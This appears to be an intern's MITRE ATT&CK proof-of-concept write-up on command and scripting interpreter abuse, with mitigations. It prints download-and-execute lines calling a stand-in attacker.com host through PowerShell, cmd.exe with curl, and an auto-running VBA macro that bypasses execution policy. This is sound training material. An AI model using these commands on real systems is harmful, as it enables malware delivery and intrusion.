# MITRE ATT&CK PoC – Command and Scripting Interpreter Abuse
Intern: Aenosh
Organization: DigiSuraksha Parhari Foundation

## Tactic: Execution (TA0002)
Goal: Execute attacker-controlled code or commands on the target system.

## Techniques:
- T1059.001 – PowerShell
  - Abuse of PowerShell to run malicious scripts and download payloads.
- T1059.003 – Windows Command Shell
  - Use of cmd.exe for direct execution, downloading, and control.
- T1059.005 – Visual Basic
  - Use of VBScript or VBA macros to trigger execution, usually embedded in Office files.

## Procedures:
### Technique 1 – PowerShell Abuse

1. Attacker prepares remote malicious script:
```powershell
Invoke-WebRequest http://attacker.com/backdoor.exe -OutFile backdoor.exe
Start-Process .\backdoor.exe
```

2. Victim runs this using PowerShell with bypass:
```bash
powershell.exe -NoProfile -ExecutionPolicy Bypass -File payload.ps1
```

3.  Backdoor connects to C2; execution achieved.

### Technique 2 – Windows Command Shell
1. Attacker abuses basic cmd to execute reverse shell or payload:

```powershell
cmd.exe /c curl http://attacker.com/payload.exe -o C:\temp\payload.exe && C:\temp\payload.exe
```

2. Can be triggered from within batch files, services, or other executables.
3. Useful in restricted PowerShell environments or older machines

### Technique 3 – Visual Basic (VBA/Macros)
1. Attacker embeds VBScript inside .doc or .xlsm:

```vb
Sub AutoOpen()
  Shell "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://attacker.com/back.ps1 -OutFile C:\temp\back.ps1; Start-Process C:\temp\back.ps1"
End Sub
```

2. Victim opens doc, enables macro → executes script → triggers backdoor

# Mitigation Strategies:

|Technique  |Mitigation                                                                             |
|-----------|---------------------------------------------------------------------------------------|
|T1059.001  |Enable PowerShell logging (ScriptBlock, Module), disable -ExecutionPolicy Bypass.      |
|T1059.003	|Monitor use of cmd.exe from unusual parent processes (like Office).                    |
|T1059.005	|Disable or restrict macros, use Protected View in MS Office, block VBA in attachments. |

# Why This PoC Works
1. Living-off-the-land: All built-in Windows tools, no exploit needed
2. Used by APTs, ransomware gangs, and pen-testers alike
3. Works in nearly every stage: initial access, privilege escalation, persistence

# References
TA0002 – Execution

T1059.001 – PowerShell

T1059.003 – Command Shell

T1059.005 – Visual Basic

🚀 Final Wrap-Up